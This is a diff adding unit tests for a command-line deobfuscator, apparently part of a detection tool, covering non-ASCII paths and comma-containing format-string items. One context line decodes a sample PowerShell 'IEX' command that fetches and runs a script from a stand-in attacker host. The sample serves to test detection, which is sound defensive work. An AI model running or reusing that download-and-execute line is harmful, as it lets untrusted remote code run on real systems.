@@ -526,6 +526,9 @@ def test_decode_command_base64_chunks():
     process = Process(command=f'powershell -enc {utf16}')
     assert process.decoded_command == 'powershell -enc IEX http://evil.example.com/ps1'
     assert process.urls == {'http://evil.example.com/ps1'}
+    # b64decode raises a plain ValueError on non-ASCII text
+    assert Process(command='notepad.exe Отчет.docx').decoded_command == 'notepad.exe Отчет.docx'
+    assert Process(command='C:\\Users\\José\\a.exe /q').decoded_command == 'C:\\Users\\José\\a.exe /q'
 
 
 @pytest.mark.unit
@@ -550,6 +553,8 @@ def test_decode_command_format_string_indexes():
     assert Process(command='cmd ("{1}{0}{1}"-f\'a\',\'b\')').decoded_command == 'cmd bab'
     # an index past the last item is left alone, it used to raise IndexError
     assert Process(command='cmd ("{0}{2}"-f\'a\',\'b\')').decoded_command == 'cmd ("{0}{2}"-f\'a\',\'b\')'
+    # an item may contain a comma
+    assert Process(command='cmd ("{0}{1}"-f\'a,b\',\'c\')').decoded_command == 'cmd a,bc'
 
 
 @pytest.mark.unit
